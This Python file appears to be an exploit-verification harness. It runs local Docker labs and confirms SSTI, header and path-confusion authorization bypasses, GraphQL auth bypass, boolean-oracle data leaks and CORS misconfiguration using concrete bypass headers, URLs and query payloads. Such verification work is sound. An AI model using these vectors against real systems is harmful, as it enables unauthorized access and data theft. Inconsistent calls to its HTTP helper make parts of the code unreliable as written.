        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": win_ep,
                             "metodo": m, "ssti_param": win_param, "a": a, "b": b,
                             "producto_esperado": expected})
        res.evidence["intentos"] = tried_all
        if found:
            res.verified = True
            res.ok = True
            if res.evidence.get("upload_name_ganador"):
                res.detail = (
                    f"SSTI multi-step confirmada: upload con name={res.evidence['upload_name_ganador']!r} "
                    f"(payload: {res.evidence['payload_ganador']!r}) + render en "
                    f"{res.evidence.get('render_url_ganador', win_ep)!r} devolvio {expected} -- "
                    f"el motor de plantillas EVALUO la plantilla subida por path traversal")
            else:
                res.detail = (f"SSTI confirmada: la peticion con {win_param}="
                              f"{res.evidence['payload_ganador']!r} hizo que el motor de plantillas "
                              f"EVALUARA la expresion y devolviera "
                              f"{res.evidence['resultado_esperado_ganador']} en la respuesta -- "
                              f"prueba inequivoca de evaluacion de codigo en servidor")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried_all)} sintaxis de plantilla para {win_param} "
                          f"(producto esperado {a}*{b}={expected}, mas las plantillas aditivas) y "
                          f"ninguna produjo el resultado esperado -- el SSTI no se confirmo")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


def verify_generic_header_bypass(
    source_dir: str, endpoint: str, http_method: str,
    bypass_header: str, bypass_value: str,
    confirm_string: str = "",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    bypass_url: Optional[str] = None,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Verifica un bypass de autorizacion via CABECERA HTTP o URL manipulada.

    Mecanismo:
    1) Levanta el lab efimero con el Dockerfile/compose del codigo descargado.
    2) Envia la peticion SIN bypass al endpoint original: espera 3xx/401/403 (bloqueado).
    3a) Si bypass_header+bypass_value: envia la misma peticion CON la cabecera de bypass.
    3b) Si bypass_url: envia peticion a la URL manipulada SIN cabecera extra (ej. path
        confusion: /api/v1/feeds;a=../../users en CVE-2024-28255 OpenMetadata).
    Si el servidor responde 2xx y el cuerpo contiene `confirm_string`, VERIFICADO.

    `bypass_header`: nombre de la cabecera maliciosa (p.ej. "x-middleware-subrequest").
    `bypass_value`: valor exacto de la cabecera (p.ej. "middleware:middleware:...").
    `bypass_url`: URL manipulada alternativa (path confusion/semicolon bypass); si se
                  proporciona, se ignoran bypass_header/bypass_value en el intento de bypass.
    `confirm_string`: cadena que debe aparecer en la respuesta con bypass para confirmar
                      acceso real (vacia = solo se comprueba que el status sea 2xx).
    """
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    if not bypass_url and (not bypass_header or not bypass_value):
        res.detail = "se necesita bypass_header+bypass_value o bypass_url para la verificacion"
        res.limitations.append("la verificacion de header bypass necesita el nombre y valor "
                               "exactos de la cabecera maliciosa, o una bypass_url alternativa")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
        url = base_url + endpoint
        step(f"probando SIN bypass: {m} {url}")
        body_normal = ""
        try:
            # allow_redirects=False: necesitamos el status REAL del servidor (3xx/401/403),
            # no el de la pagina de login/error a la que redirige -- igual que open_redirect.
            r_normal = _http_request(m, url, timeout=15, allow_redirects=False)
            status_normal = r_normal.status_code
            body_normal = getattr(r_normal, "text", "") or ""
        except Exception as e:
            status_normal = -1
            step(f"error en peticion normal: {e}")

        if bypass_url:
            step(f"probando CON URL manipulada (path confusion): {m} {base_url + bypass_url}")
            try:
                r_bypass = _http_request(m, base_url + bypass_url, timeout=15,
                                         allow_redirects=False)
                status_bypass = r_bypass.status_code
                body_bypass = r_bypass.text or ""
            except Exception as e:
                status_bypass = -1
                body_bypass = ""
                step(f"error en peticion con bypass_url: {e}")
        else:
            step(f"probando CON cabecera '{bypass_header}: {bypass_value}'")
            try:
                r_bypass = _http_request(m, url, timeout=15, allow_redirects=False,
                                         headers={bypass_header: bypass_value})
                status_bypass = r_bypass.status_code
                body_bypass = r_bypass.text or ""
            except Exception as e:
                status_bypass = -1
                body_bypass = ""
                step(f"error en peticion con bypass: {e}")

        _bypass_desc = (f"URL manipulada '{bypass_url}'" if bypass_url
                        else f"cabecera '{bypass_header}: {bypass_value}'")
        res.evidence = {
            "base_url": base_url,
            "contenedor": container,
            "endpoint": endpoint,
            "bypass_url": bypass_url or "",
            "metodo": m,
            "bypass_header": bypass_header,
            "bypass_value": bypass_value,
            "status_sin_bypass": status_normal,
            "status_con_bypass": status_bypass,
            "confirm_string": confirm_string,
            "confirm_string_presente": bool(confirm_string and confirm_string in body_bypass),
            "respuesta_cuerpo_recorte": body_bypass[:500],
        }

        blocked_normally = status_normal not in range(200, 300)
        bypassed = status_bypass in range(200, 300)
        string_ok = (not confirm_string) or (confirm_string in body_bypass)

        if blocked_normally and bypassed and string_ok:
            res.verified = True
            res.ok = True
            res.detail = (
                f"BYPASS confirmado: sin {_bypass_desc} el servidor responde "
                f"{status_normal}; con {_bypass_desc} responde "
                f"{status_bypass}" +
                (f" y el cuerpo contiene '{confirm_string}'" if confirm_string else "") +
                " -- el control de autorizacion fue eludido"
            )
            step("capturando evidencia visual (screenshots del laboratorio)...")
            shots, http_caps = _take_generic_screenshots_bypass(
                base_url, endpoint, m, bypass_header or "bypass_url", bypass_url or bypass_value,
                status_normal, body_normal, status_bypass, body_bypass)
            if shots:
                res.evidence["screenshots"] = shots
            if http_caps:
                res.evidence["http_captures"] = http_caps
        else:
            res.ok = True
            # Diagnostico automatico: razona por que fallo el bypass
            _diag = []
            if status_normal in range(200, 300):
                _diag.append(
                    f"el endpoint responde {status_normal} SIN el bypass -- el middleware "
                    f"no esta bloqueando la ruta; revisa que el middleware cubra '{endpoint}'"
                )
            elif status_normal == -1:
                _diag.append(f"error de red al probar sin bypass -- el servidor no responde en {endpoint}")
            else:
                # Middleware SI bloquea (correcto). Analiza por que el bypass no funciono.
                if status_bypass == status_normal:
                    _diag.append(
                        f"el bypass NO cambio el status ({status_normal} → {status_bypass}) -- "
                        f"el header '{bypass_header}: {bypass_value}' no fue procesado; "
                        f"posibles causas: (1) version del servidor incorrecta para esta CVE, "
                        f"(2) valor del bypass incorrecto (prueba variantes: 'src/middleware', "
                        f"'pages/_middleware', 'middleware:middleware'), "
                        f"(3) el middleware no lee ese header internamente"
                    )
                elif status_bypass in range(200, 300) and confirm_string and not string_ok:
                    _diag.append(
                        f"bypass llego al endpoint (status {status_bypass}) pero confirm_string "
                        f"'{confirm_string}' no aparece en la respuesta -- el lab puede no estar "
                        f"sirviendo el recurso esperado en '{endpoint}'"
                    )
                elif status_bypass not in range(200, 300):
                    _diag.append(
                        f"bypass no dio 2xx (status {status_bypass}) -- el servidor sigue "
                        f"bloqueando incluso con el header; prueba variantes del valor del bypass"
                    )
            res.detail = (
                f"header bypass no confirmado: status_sin_bypass={status_normal}, "
                f"status_con_bypass={status_bypass}" +
                (f", confirm_string_presente={string_ok}" if confirm_string else "") +
                (f" -- DIAGNOSTICO: {'; '.join(_diag)}" if _diag else "")
            )
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


# ── GraphQL auth-bypass verifier ──────────────────────────────────────────────

def verify_generic_graphql_bypass(
    source_dir: str, graphql_endpoint: str,
    forbidden_query: str, confirm_field: str,
    bypass_header: str = "", bypass_value: str = "",
    anon_expected_status: int = 403,
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
) -> WpVerifyResult:
    """Verifica un auth-bypass en un endpoint GraphQL (p.ej. Craft CMS CVE-2026-124427).

    Mecanismo:
    1) Levanta el lab efimero con _bootstrap_generic_lab.
    2) Envia una query GraphQL de introspección para confirmar que el endpoint existe.
    3) Envia `forbidden_query` SIN autenticación: espera rechazo (403/401 o error de auth).
    4) Envia `forbidden_query` CON la cabecera de bypass o sin credenciales pero con el
       vector de bypass (prev/next field, __typename abuse, etc.): si la respuesta 2xx
       contiene `confirm_field`, la vulnerabilidad queda VERIFICADA.

    `forbidden_query`: query GraphQL completa que debería requerir autenticación.
    `confirm_field`:   subcadena que debe aparecer en la respuesta exitosa (p.ej. un
                       nombre de campo privado, un secreto, el token de sesión).
    `bypass_header` / `bypass_value`: cabecera de bypass opcional (vacío si el bypass
                       es solo estructural en la query).
    `anon_expected_status`: código esperado al enviar sin autenticación (default 403).
    """
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    tup = _bootstrap_generic_lab(source_dir, step, res, budget_s)
    if tup is None:
        return res
    lab, base_url, container = tup

    try:
        endpoint_url = base_url.rstrip("/") + "/" + graphql_endpoint.lstrip("/")
        gql_headers = {"Content-Type": "application/json", "Accept": "application/json"}

        # Step 1: introspección — confirmar que el endpoint GraphQL responde
        step(f"Paso 1: introspección GraphQL en {graphql_endpoint}")
        intro_query = '{"query":"{ __schema { queryType { name } } }"}'
        s_intro, _, b_intro = _http_request(
            base_url, graphql_endpoint, "POST",
            headers=gql_headers, body=intro_query.encode(), timeout=15.0)
        if s_intro == 0 or b_intro is None:
            res.detail = f"endpoint GraphQL {graphql_endpoint} no responde"
            res.ok = True
            return res
        has_gql = b"__schema" in b_intro or b"queryType" in b_intro or s_intro == 200
        step(f"  introspección: status={s_intro} graphql={'SI' if has_gql else 'NO'}")
        res.evidence["intro_status"] = s_intro
        res.evidence["intro_body_recorte"] = b_intro[:200].decode("utf-8", "replace")

        # Step 2: query restringida SIN autenticación → debe rechazarse
        step(f"Paso 2: query restringida SIN autenticación (esperado {anon_expected_status})")
        body_forbidden = json.dumps({"query": forbidden_query}).encode()
        s_anon, _, b_anon = _http_request(
            base_url, graphql_endpoint, "POST",
            headers=gql_headers, body=body_forbidden, timeout=15.0)
        anon_body = (b_anon or b"").decode("utf-8", "replace")
        step(f"  sin auth: status={s_anon} body={anon_body[:120]!r}")
        res.evidence["anon_status"] = s_anon
        res.evidence["anon_body_recorte"] = anon_body[:300]

        # Step 3: bypass — con cabecera o query modificada
        bypass_hdrs = dict(gql_headers)
        if bypass_header:
            bypass_hdrs[bypass_header] = bypass_value
            step(f"Paso 3: query con cabecera bypass {bypass_header}: {bypass_value[:60]}")
        else:
            step("Paso 3: query con vector de bypass estructural (sin cabecera extra)")
        s_byp, _, b_byp = _http_request(
            base_url, graphql_endpoint, "POST",
            headers=bypass_hdrs, body=body_forbidden, timeout=15.0)
        byp_body = (b_byp or b"").decode("utf-8", "replace")
        step(f"  con bypass: status={s_byp} body={byp_body[:200]!r}")
        res.evidence["bypass_status"] = s_byp
        res.evidence["bypass_body_recorte"] = byp_body[:500]
        res.evidence["endpoint"] = graphql_endpoint
        res.evidence["metodo"] = "POST"
        res.evidence["base_url"] = base_url
        res.evidence["contenedor"] = container

        confirmed = (s_byp == 200 and confirm_field and confirm_field in byp_body)
        if not confirmed and s_byp == 200 and not confirm_field:
            # Sin campo de confirmación: si el bypass da 200 y el anon daba != 200
            confirmed = (s_anon != 200)

        if confirmed:
            res.verified = True
            res.ok = True
            res.evidence["respuesta_cuerpo_recorte"] = byp_body[:500]
            res.detail = (f"GRAPHQL AUTH-BYPASS CONFIRMADO: query restringida devuelve 200 "
                          f"con el vector de bypass (campo '{confirm_field}' presente). "
                          f"Sin bypass: status={s_anon}. Con bypass: status={s_byp}.")
            step(f"VERIFICADO: GraphQL auth-bypass confirmado — '{confirm_field}' en respuesta")
            _add_exploit_evidence(
                res=res, method="POST", url=endpoint_url,
                resp_or_body=byp_body[:3000], highlight=confirm_field,
                caption_es=(f"GRAPHQL AUTH-BYPASS CONFIRMADO: campo '{confirm_field}' accesible "
                            f"sin autenticacion via bypass — status {s_byp}."),
                caption_en=(f"GRAPHQL AUTH-BYPASS CONFIRMED: field '{confirm_field}' accessible "
                            f"without auth via bypass — status {s_byp}."),
            )
        else:
            res.ok = True
            res.detail = (f"el vector de bypass no confirmo acceso no autorizado al campo "
                          f"'{confirm_field}' — sin bypass: {s_anon}, con bypass: {s_byp}")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_graphql_bypass: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico...")
        lab.teardown()


# ── Boolean oracle / data-leak verifier ───────────────────────────────────────

def verify_generic_boolean_oracle(
    source_dir: str, endpoint: str, http_method: str,
    true_param: str, true_value: str,
    false_param: str, false_value: str,
    confirm_field: str = "",
    extra_headers: Optional[dict] = None,
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    prebuilt_url: str = "",
) -> WpVerifyResult:
    """Verifica una vulnerabilidad de tipo oracle booleano (p.ej. Strapi CVE-2026-27886).

    El patrón: el servidor filtra registros según una condición booleana controlada por
    el atacante. La diferencia de respuesta entre condición TRUE y FALSE confirma el leak.

    Mecanismo:
    1) Levanta el lab efimero.
    2) Envia la petición con `true_param=true_value` (condición siempre verdadera):
       espera respuesta con contenido (lista no vacía, campo con datos).
    3) Envia la petición con `false_param=false_value` (condición siempre falsa):
       espera respuesta vacía o diferente.
    4) Si la diferencia de bytes entre TRUE y FALSE supera un umbral, el oracle está
       confirmado. Si además `confirm_field` aparece solo en la respuesta TRUE, es prueba
       directa de exfiltración de datos.

    `true_param`/`true_value`:  parámetro y valor que hace la condición TRUE (p.ej. `where[id][$gt]=0`).
    `false_param`/`false_value`: parámetro y valor que hace la condición FALSE (p.ej. `where[id][$lt]=0`).
    `confirm_field`: campo que debe aparecer SOLO en la respuesta TRUE (p.ej. `"email"`, `"token"`).
    """
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    tup = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                  prebuilt_url=prebuilt_url)
    if tup is None:
        return res
    lab, base_url, container = tup

    try:
        hdrs = dict(extra_headers or {})
        hdrs.setdefault("Accept", "application/json")

        def _get(param, value):
            sep = "&" if "?" in endpoint else "?"
            ep_q = endpoint + sep + f"{param}={value}"
            full_url = base_url.rstrip("/") + ep_q
            r = _http_request(http_method.upper(), full_url,
                               headers=hdrs, timeout=15.0)
            return r.status_code, (r.content or b"").decode("utf-8", "replace")

        step(f"Paso 1: condición TRUE — {true_param}={true_value}")
        s_true, b_true = _get(true_param, true_value)
        step(f"  TRUE: status={s_true} bytes={len(b_true)} preview={b_true[:120]!r}")

        step(f"Paso 2: condición FALSE — {false_param}={false_value}")
        s_false, b_false = _get(false_param, false_value)
        step(f"  FALSE: status={s_false} bytes={len(b_false)} preview={b_false[:120]!r}")

        res.evidence.update({
            "endpoint": endpoint, "metodo": http_method.upper(),
            "base_url": base_url, "contenedor": container,
            "true_status": s_true, "false_status": s_false,
            "true_bytes": len(b_true), "false_bytes": len(b_false),
            "true_body_recorte": b_true[:300], "false_body_recorte": b_false[:300],
        })

        byte_diff = abs(len(b_true) - len(b_false))
        field_only_in_true = confirm_field and confirm_field in b_true and confirm_field not in b_false
        confirmed = (s_true == 200 and byte_diff > 20) and (field_only_in_true or byte_diff > 100)

        if confirmed:
            res.verified = True
            res.ok = True
            res.evidence["diferencia_bytes"] = byte_diff
            res.evidence["respuesta_cuerpo_recorte"] = b_true[:500]
            res.detail = (f"BOOLEAN ORACLE CONFIRMADO: diferencia de {byte_diff} bytes entre "
                          f"condición TRUE ({len(b_true)}B) y FALSE ({len(b_false)}B). "
                          + (f"Campo '{confirm_field}' aparece SOLO en TRUE." if field_only_in_true else ""))
            step(f"VERIFICADO: boolean oracle — dif={byte_diff}B campo={confirm_field}")
            _add_exploit_evidence(
                res=res, method=http_method.upper(), url=base_url + endpoint,
                resp_or_body=b_true, highlight=confirm_field or "",
                caption_es=(f"BOOLEAN ORACLE confirmado: TRUE={len(b_true)}B, "
                            f"FALSE={len(b_false)}B — diferencia de {byte_diff} bytes."),
                caption_en=(f"BOOLEAN ORACLE confirmed: TRUE={len(b_true)}B, "
                            f"FALSE={len(b_false)}B — {byte_diff}-byte differential."),
            )
        else:
            res.ok = True
            res.detail = (f"diferencia TRUE/FALSE insuficiente para confirmar oracle "
                          f"({byte_diff}B) — puede que la condición no controle la query, "
                          f"o que el endpoint filtre por otro mecanismo")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_boolean_oracle: {e}"
        return res
    finally:
        if lab is not None:
            step("desmontando el laboratorio generico...")
            lab.teardown()


def verify_generic_cors_misconfig(
    source_dir: str, endpoint: str, http_method: str = "GET",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0, custom_headers: Optional[dict] = None,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Verifica CORS misconfiguration: reflexion del Origin en Access-Control-Allow-Origin
    + Access-Control-Allow-Credentials: true (CVE-2025-53092 Strapi y otros).

    Mecanismo:
    1) Levanta el lab efimero con el Dockerfile/compose del codigo descargado.
    2) Envia la misma peticion SIN Origin y CON Origin: http://<token>.invalid.
    3) CONFIRMADO si:
       a) Access-Control-Allow-Origin en la respuesta REFLEJA el Origin enviado (no '*')
       b) Access-Control-Allow-Credentials: true esta presente
    Si solo se da (a) sin (b), reporta 'cors-weak' (critico-con-matices).
    Si Access-Control-Allow-Origin: * sin Credentials → no es ACAO reflection.
    Prueba multiples endpoints comunes (/api/, /api/users, /) si el endpoint dado falla."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        m = (http_method or "GET").upper().split("/")[0].strip() or "GET"
        cors_token = f"http://binoracle-cors-{_token()}.invalid"
        step(f"probando CORS reflection con Origin: {cors_token}")

        # Candidates: LLM-provided endpoint + common fallbacks
        candidates = [endpoint] if endpoint else []
        for ep in ["/api/", "/api/users", "/api/users?pageSize=1", "/"]:
            if ep not in candidates:
                candidates.append(ep)

        tried = []
        found = False
        result_data: dict = {}
        for ep in candidates:
            if found:
                break
            url = base_url + ep
            try:
                r = _http_request(m, url, timeout=15,
                                  headers={"Origin": cors_token, **(custom_headers or {})})
            except Exception as e:
                tried.append({"endpoint": ep, "error": str(e)})
                continue
            hdrs = {k.lower(): v for k, v in (getattr(r, "headers", {}) or {}).items()}
            acao = hdrs.get("access-control-allow-origin", "")
            acac = hdrs.get("access-control-allow-credentials", "").strip().lower()
            reflected = cors_token in acao or acao.strip() == cors_token.strip()
            credentials_true = acac == "true"
            tried.append({"endpoint": ep, "acao": acao, "acac": acac,
                          "reflejado": reflected, "credentials": credentials_true,
                          "status": r.status_code})
            step(f"  {ep} → ACAO: {acao!r}, ACAC: {acac!r}")
            if reflected:
                found = True
                result_data = {"endpoint": ep, "acao": acao, "acac": acac,
                               "reflejado": reflected, "credentials": credentials_true}

        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            rd = result_data
            if rd.get("credentials"):
                res.detail = (f"CORS MISCONFIGURATION CONFIRMADA: {rd['endpoint']} refleja "
                              f"el Origin del atacante (ACAO={rd['acao']!r}) con "
                              f"Access-Control-Allow-Credentials: true — permite peticiones "
                              f"cross-origin autenticadas desde dominios arbitrarios.")
                step(f"VERIFICADO (cors+credentials): {rd['endpoint']} — credenciales cross-origin "
                     f"habilitadas para origen arbitrario")
            else:
                res.detail = (f"CORS REFLECTION (sin credentials): {rd['endpoint']} refleja "
                              f"el Origin (ACAO={rd['acao']!r}) pero sin Credentials:true — "
                              f"riesgo menor (no afecta requests autenticados).")
                step(f"VERIFICADO (cors-reflection): {rd['endpoint']} — reflection sin credentials")
            _cors_body = (f"Access-Control-Allow-Origin: {rd['acao']}\n"
                          f"Access-Control-Allow-Credentials: {rd['acac']}\n\n"
                          f"Origin enviado: {cors_token}\n"
                          f"Endpoint: {rd['endpoint']}")
            _add_exploit_evidence(
                res=res, method=m, url=base_url + rd["endpoint"],
                resp_or_body=_cors_body,
                highlight=cors_token.split("//")[1] if "//" in cors_token else cors_token,
                caption_es=(f"CORS MISCONFIGURATION CONFIRMADA: ACAO={rd['acao']!r} "
                            f"refleja el Origin del atacante"
                            + (" con Credentials:true." if rd.get("credentials") else " (sin credentials).")),
                caption_en=(f"CORS MISCONFIGURATION CONFIRMED: ACAO={rd['acao']!r} "
                            f"reflects attacker Origin"
                            + (" with Credentials:true." if rd.get("credentials") else " (no credentials).")),
            )
        else:
            res.ok = True
            res.detail = (f"CORS reflection no detectada en {len(tried)} endpoints — "
                          f"ninguno reflejo el Origin en Access-Control-Allow-Origin")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_cors_misconfig: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico...")
        lab.teardown()


def verify_generic_http_confirm(
    source_dir: str, endpoint: str, http_method: str = "GET",
    confirm_string: str = "", patched_patterns: Optional[List[str]] = None,
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0, custom_headers: Optional[dict] = None,
    post_data: Optional[dict] = None,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    setup_wait_extra_s: float = 0.0,
) -> WpVerifyResult:
    """Verificador generico de string de confirmacion en respuesta HTTP.

    Usado para CVEs cuya prueba de explotacion se reduce a:
      "enviar peticion X -> si la respuesta contiene confirm_string, vulnerable".

    Ejemplos: Drupal install.php RCE (confirm_string='Choose language'),
    cualquier endpoint cuyo comportamiento vulnerable se detecta con un string
    especifico en la respuesta.

    Parametros:
      confirm_string   - substring que, SI aparece en la respuesta, confirma
                         la vulnerabilidad.
      patched_patterns - lista de strings que, si aparecen, indican un sitio YA
                         parcheado (ej. 'AlreadyInstalled', 'already installed').
      setup_wait_extra_s - segundos adicionales de espera despues del health check
                           (util cuando el Dockerfile hace instalaciones largas).
    """
    import time as _time
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res
    if not confirm_string:
        res.detail = "confirm_string vacia, no se puede confirmar la vulnerabilidad"
        res.limitations.append("se necesita confirm_string para verificar la explotacion")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        if setup_wait_extra_s > 0:
            step(f"esperando {setup_wait_extra_s:.0f}s adicionales para que el lab este listo...")
            _time.sleep(setup_wait_extra_s)

        m = (http_method or "GET").upper().strip() or "GET"
        hdrs = dict(custom_headers or {})
        url = base_url.rstrip("/") + "/" + endpoint.lstrip("/")
        step(f"enviando {m} {endpoint} buscando confirm_string={confirm_string!r}...")
        try:
            resp = _http_request(m, url, timeout=20, data=post_data,
                                 headers=hdrs if hdrs else None)
        except Exception as e:
            res.detail = f"peticion HTTP fallida: {e}"
            return res

        body = resp.text if hasattr(resp, "text") else (resp.get("body") or "")
        if patched_patterns and any(pat.lower() in body.lower() for pat in patched_patterns):
            matched = next(p for p in patched_patterns if p.lower() in body.lower())
            res.detail = (f"respuesta contiene patron de parche {matched!r} -> "
                          f"este endpoint ya fue corregido")
            res.evidence = body[:500]
            return res

        if confirm_string.lower() in body.lower():
            res.verified = True
            res.detail = (f"confirm_string {confirm_string!r} encontrado en la respuesta "
                          f"de {m} {endpoint} -- vulnerabilidad confirmada")
            res.evidence = {
                "respuesta_cuerpo_recorte": body[:800],
                "confirm_string": confirm_string,
                "status_code": resp.status_code if hasattr(resp, "status_code") else 200,
                "url": url, "metodo": m,
            }
            _add_exploit_evidence(
                res=res, method=m, url=url, resp_or_body=resp,
                highlight=confirm_string,
                caption_es=(f"VULNERABILIDAD CONFIRMADA: '{confirm_string}' encontrado en "
                            f"respuesta de {m} {endpoint}."),
                caption_en=(f"VULNERABILITY CONFIRMED: '{confirm_string}' found in "
                            f"response of {m} {endpoint}."),
            )
            return res

        res.detail = (f"confirm_string {confirm_string!r} NO encontrado en la respuesta "
                      f"de {m} {endpoint} (len={len(body)})")
        res.evidence = body[:300]
        return res
    except Exception as e:
        res.detail = f"error inesperado en verify_generic_http_confirm: {e}"
        return res
    finally:
        step("desmontando el laboratorio generico...")
        lab.teardown()
